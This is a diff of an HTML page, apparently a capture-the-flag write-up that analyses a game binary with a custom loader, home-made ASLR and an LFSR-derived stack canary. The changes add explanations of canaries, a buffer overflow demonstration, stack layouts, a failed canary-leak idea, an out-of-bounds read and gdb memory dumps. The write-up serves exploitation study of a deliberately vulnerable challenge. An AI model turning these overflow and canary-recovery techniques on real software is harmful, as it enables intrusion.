 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -525,10 +772,128 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Notice that there is a <strong>buffer overflow bug</strong> in the <code>get_player_name</code>. Even though they have add condition to check the length, they still continue reading the name, which makes buffer overflow is still possible. This method will be used only if our scores is higher than any value in the scoreboard, where we will need to send our name as the input, and the scoreboard will be updated.</p>
-<p>However, looking through the code, this binary has already done a mitigation from buffer overflow bug with <code>canary</code> to prevent stack smashing. So, we need a way to leak the <code>canary</code>.</p>
-<p>An idea would be to overflow our inputted name until just before the canary, so that the <code>canary</code> will be included as part of our name in the scoreboard.</p>
-<p>However, notice that we can&rsquo;t do this to leak the <code>canary</code>, because this LOC <code>local_20 = local_20 &amp; 0xffffffffffffff;</code> will always set a null terminator (<code>\x00</code>) on <code>0x20</code> from our inputted name address. So, even though we can overflow the inputted name, the stored name copied to the scoreboard will be only our first <code>0x1f</code> characters.</p>
-<p>Let&rsquo;s check another method defined in this object file, especially on the third menu function.</p>
+<p>However, looking through the code, this binary has already done a mitigation from buffer overflow bug with <code>canary</code> to prevent stack smashing. In case you didn&rsquo;t know what that is, <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener">canary</a> is a secret value that placed near the stack return pointer. The purpose of this is to detect whether buffer overflow is performed or not. How to detect it? Well during sending our buffer overflow payload to overwrite the stack return pointer, because <code>canary</code> is placed before the return pointer, that means the <code>canary</code> will be overwritten also. And then before jump to the return pointer, the binary will check whether the <code>canary</code> in the stack is correct or not, and then return <code>Stack smashing detected</code> if this value is changed from the stack. Below is the example demonstration.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Round 12
+</span></span><span style="display:flex;"><span>How much is 1 + 2 ?
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>Wrong! Game Over!
+</span></span><span style="display:flex;"><span>Congratulations! You&#39;re going to the SCOREBOARD!
+</span></span><span style="display:flex;"><span>How long is your name (0-31)?
+</span></span><span style="display:flex;"><span>60
+</span></span><span style="display:flex;"><span>Name too long! No SCOREBOARD for you.
+</span></span><span style="display:flex;"><span>Now type in your name:
+</span></span><span style="display:flex;"><span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span style="display:flex;"><span>Stack smashing detected - mischief not managed!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The above example happened due to our example buffer overflow input, where the <code>canary</code> value got replaced with <code>aaaaaaaa</code>. So, how do we usually bypass this? The answer is we need to simply know the <code>canary</code> value, so that we can carefully craft our payload, so that when we do buffer overflow, we can place the <code>canary</code> value in our payload before our overwritten return pointer, so that when the binary do the <code>canary</code> check, the check will be passed. So, in order to do this, we need a way to leak the <code>canary</code>.</p>
+<p>An idea would be to overflow our inputted name until just before the canary, so that the <code>canary</code> will be included as part of our name in the scoreboard. To give illustration, consider this LOC in the <code>game</code> method:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>strcpy(game_names <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)param_1 <span style="color:#555">*</span> <span style="color:#f60">0x20</span>,(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#555">&amp;</span>local_38);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The above LOC will basically copy our inputted string to <code>game_names</code> until it found null terminator <code>\x00</code>. The idea is to overflow our name and stop just before the <code>canary</code> value so that the null terminator <code>\x00</code> detected by <code>strcpy</code> will be null after <code>canary</code> value. Example:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Suppose that the stack layout is like below, where:
+</span></span><span style="display:flex;"><span>- 0x7fffffffdb10 = address of our input
+</span></span><span style="display:flex;"><span>- 0x7fffffffdb38 = our canary value
+</span></span><span style="display:flex;"><span>0x7fffffffdb10:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7fffffffdb20:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7fffffffdb30:	0x0000000000000000	0xdfe0586beeff1337
+</span></span><span style="display:flex;"><span>0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>If we overflow our input until 0x7fffffffdb37, the stack will be like below:
+</span></span><span style="display:flex;"><span>0x7fffffffdb10:	0x6161616161616161	0x6161616161616161
+</span></span><span style="display:flex;"><span>0x7fffffffdb20:	0x6161616161616161	0x6161616161616161
+</span></span><span style="display:flex;"><span>0x7fffffffdb30:	0x6161616161616161	0xdfe0586beeff1337
+</span></span><span style="display:flex;"><span>0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>And when the strcpy got called, it will copy our name together with the canary,
+</span></span><span style="display:flex;"><span>because the null terminator is found in 0x7fffffffdb40
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>However, notice that <strong>we can&rsquo;t do this</strong> to leak the <code>canary</code>, because this LOC in <code>game</code> method <code>local_20 = local_20 &amp; 0xffffffffffffff;</code>, which is placed just before the <code>strcpy</code> LOC, and it will always set a null terminator (<code>\x00</code>) on <code>0x20</code> from our inputted name address before do the <code>strcpy</code>. So, even though we can overflow the inputted name, the stored name copied to the scoreboard will be only our first <code>0x1f</code> characters, which implies that the above idea is a pitfall idea. See below illustration to understand it better:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Suppose that the stack layout is like below, where:
+</span></span><span style="display:flex;"><span>- 0x7fffffffdb10 = address of our input
+</span></span><span style="display:flex;"><span>- 0x7fffffffdb38 = our canary value
+</span></span><span style="display:flex;"><span>0x7fffffffdb10:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7fffffffdb20:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7fffffffdb30:	0x0000000000000000	0xdfe0586beeff1337
+</span></span><span style="display:flex;"><span>0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>If we overflow our input until 0x7fffffffdb37,
+</span></span><span style="display:flex;"><span>because of the LOC &#34;local_20 = local_20 &amp; 0xffffffffffffff;&#34;
+</span></span><span style="display:flex;"><span>the stack will be like below:
+</span></span><span style="display:flex;"><span>0x7fffffffdb10:	0x6161616161616161	0x6161616161616161
+</span></span><span style="display:flex;"><span>0x7fffffffdb20:	0x6161616161616161	0x0061616161616161
+</span></span><span style="display:flex;"><span>0x7fffffffdb30:	0x6161616161616161	0xdfe0586beeff1337
+</span></span><span style="display:flex;"><span>0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>And when the strcpy got called, it won&#39;t copy our name together with the canary,
+</span></span><span style="display:flex;"><span>because the null terminator is found in 0x7fffffffdb2f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So let&rsquo;s dive further to the code to find a way to leak the <code>canary</code> value. Let&rsquo;s check another method defined in this object file, especially on the third menu function, which allow us to see the score in the <code>scoreboard[inputted_offset]</code>.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -599,9 +964,11 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Notice that we found our second bug, where we can do out-of-bounds (OOB) read on the scoreboard array. There isn&rsquo;t any bound checking, so with this bug, hopefully we can leak useful value. Keep in mind that we need to leak the <code>canary</code> value.</p>
+</div><p>Notice that we found our second bug, where we can do out-of-bounds (OOB) read on the scoreboard array. There isn&rsquo;t any bound checking when accessing the <code>game_scoreboard</code> array, which mean we can leak any value even though it is placed outside the array. So with this bug, hopefully we can leak useful value later. Keep in mind that our goal is to leak the <code>canary</code> value.</p>
 <h4 id="decompilation-of-loader">Decompilation of loader <a href="#decompilation-of-loader" class="anchor">#</a></h4>
-<p>Now we have understand the <code>game.o</code> object file, we need a way to leak the canary value, so that we can use the buffer overflow bug to do ROP chain. Reading through the chall desc, it seems like this binary is implementing their own ASLR. Let&rsquo;s check how the <code>loader</code> binary works by decompiling it one by one. Let&rsquo;s start by decompiling the <code>_start</code> method, which is the first entry of the loader.</p>
+<p>Now we have understand the <code>game.o</code> object file, we still haven&rsquo;t found a way to leak the canary value, so that we can use the buffer overflow bug to do ROP chain.</p>
+<p>Reading through the chall desc, it seems like this binary is implementing their own ASLR. Let&rsquo;s check how the <code>loader</code> binary works by decompiling it one by one.</p>
+<p>Let&rsquo;s start by decompiling the <code>_start</code> method, which is the first entry of the loader.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -685,7 +1052,7 @@
 </ul>
 <p>Let&rsquo;s try to go through with it step by step.</p>
 <h5 id="initialize-random-state">Initialize Random State <a href="#initialize-random-state" class="anchor">#</a></h5>
-<p>On this step, the <code>loader</code> will initialize its random state before running the <code>game</code> object file.</p>
+<p>On this step, the <code>loader</code> will initialize its random state before running the <code>game</code> object file. Let&rsquo;s check the LOC of this step:</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
@@ -778,9 +1145,9 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Basically what this method want to aim is generating the <code>canary</code> value from the custom <code>rand()</code> method. Also if you read the assembly, before calling <code>rand()</code>, it actually set the <code>edi</code> to <code>0x40</code>:</p>
-<ul>
-<li><code>   0040215e bf 40 00 00    MOV         EDI,0x40 00</code></li>
-</ul>
+<p><p class="markdown-image">
+  <img src="https://i.imgur.com/VQQgYIT.png" alt=""  />
+</p></p>
 <p>Let&rsquo;s check the <code>rand()</code> method to understand it better how it generates the canary value.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
@@ -876,14 +1243,15 @@
 <ul>
 <li>Set <code>edi</code> before calling <code>rand()</code>. <code>edi</code> will be used as how much bit do the random integer that we want to generate. In this case, it is 64-bit (0x40).</li>
 <li><code>rand_extract_bit(n)</code> is basically just take the n-th bit of the <code>rand_state</code></li>
-<li><code>rand_get_bit()</code> is basically will generate a bit which is result of <code>rand_extract_bit(63) ^ rand_extract_bit(61) ^ rand_extract_bit(60) ^ rand_extract_bit(58) ^ 1</code>.
+<li><code>rand_get_bit()</code> is basically will generate a bit which is the result of:
 <ul>
-<li>And it will also remove the MSB of the <code>rand_state</code> by do left shift by 1, and then put the generated bit as the LSB.</li>
+<li><code>rand_extract_bit(63) ^ rand_extract_bit(61) ^ rand_extract_bit(60) ^ rand_extract_bit(58) ^ 1</code>.</li>
+<li>And also notice that after generating the random bit, it will remove the MSB of the <code>rand_state</code> by doing left shift by 1 (<code>&lt;&lt; 1</code>), and then put the generated bit as the new LSB.</li>
 </ul>
 </li>
 </ul>
-<p>The rand method is pretty linear, so keep in mind that we might be able to recover this <code>rand_state</code>.</p>
-<p>One of important thing that we can notice is, after calling this <code>rand()</code>, <strong>the <code>canary</code> is basically set as the current <code>rand_state</code></strong>. If we able to leak the next n-consecutive of the <code>rand()</code> method, we might be able to leak the <code>canary</code> value.</p>
+<p>The rand method is pretty linear, so keep in mind that we might be able to recover this <code>rand_state</code> if we know enough of the result of <code>rand()</code> values.</p>
+<p>Back to the <code>init_stack_guard</code> method, one of important thing that we can notice from this method is that after calling this <code>rand()</code>, <strong>the <code>canary</code> is basically will be set as the latest <code>rand_state</code></strong>, which mean after this call, the next n <code>rand()</code> calls will be based on the <code>canary</code> of the binary as its initial state. This piece of information will be useful later.</p>
 <h5 id="load-the-given-object-files-to-the-loader">Load the given object files to the loader <a href="#load-the-given-object-files-to-the-loader" class="anchor">#</a></h5>
 <p>Now, let&rsquo;s move to the below LOC</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
@@ -902,7 +1270,54 @@
 </span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>To understand it better, let&rsquo;s check the <code>load_o_phase_1</code> method.</p>
+</div><p>What is <code>files</code>? Inspecting it via gdb, it is an array consist of our object filenames. (Notes that the <code>loader</code> binary is No PIE, so the address of global variable such as <code>files</code> and <code>rand_state</code> is consistent, which in this case, <code>files</code> address is <code>0x4041e0</code>).</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/10gx 0x4041e0
+</span></span><span style="display:flex;"><span>0x4041e0 &lt;files&gt;:	0x0000000000403000	0x0000000000403007
+</span></span><span style="display:flex;"><span>0x4041f0 &lt;files+16&gt;:	0x0000000000403012	0x000000000040301a
+</span></span><span style="display:flex;"><span>0x404200 &lt;files+32&gt;:	0x0000000000403022	0x0000000000403029
+</span></span><span style="display:flex;"><span>0x404210 &lt;files+48&gt;:	0x000000000040302f	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404220 &lt;o_info&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>gef➤  x/s 0x403000
+</span></span><span style="display:flex;"><span>0x403000:	&#34;main.o&#34;
+</span></span><span style="display:flex;"><span>gef➤  x/s 0x403007
+</span></span><span style="display:flex;"><span>0x403007:	&#34;syscalls.o&#34;
+</span></span><span style="display:flex;"><span>gef➤  x/s 0x403012
+</span></span><span style="display:flex;"><span>0x403012:	&#34;guard.o&#34;
+</span></span><span style="display:flex;"><span>gef➤  x/s 0x40301a
+</span></span><span style="display:flex;"><span>0x40301a:	&#34;basic.o&#34;
+</span></span><span style="display:flex;"><span>gef➤  x/s 0x403022
+</span></span><span style="display:flex;"><span>0x403022:	&#34;game.o&#34;
+</span></span><span style="display:flex;"><span>gef➤  x/s 0x403029
+</span></span><span style="display:flex;"><span>0x403029:	&#34;res.o&#34;
+</span></span><span style="display:flex;"><span>gef➤  x/s 0x40302f
+</span></span><span style="display:flex;"><span>0x40302f:	&#34;debug.o&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, that LOC will iterate array of object filenames, and then pass it to the <code>load_o_phase_1</code> method. To understand it better, let&rsquo;s check the method decompiled result.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
@@ -1168,7 +1583,8 @@
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>uVar3 <span style="color:#555">=</span> aslr_get_addr(<span style="color:#555">*</span>(ushort <span style="color:#555">*</span>)(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">+</span> <span style="color:#f60">0x3c</span>) <span style="color:#555">+</span> <span style="color:#f60">1</span>);
 </span></span></code></pre></td></tr></table>
 </div>
-</div><div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+</div><p>On each load, the method will call <code>aslr_get_addr</code>. Let&rsquo;s check this method.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
@@ -1191,10 +1607,6 @@
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ulong <span style="color:#c0f">aslr_get_addr</span>(<span style="color:#078;font-weight:bold">int</span> param_1)
@@ -1206,10 +1618,6 @@
 </span></span><span style="display:flex;"><span>  ulong uVar3;
 </span></span><span style="display:flex;"><span>  
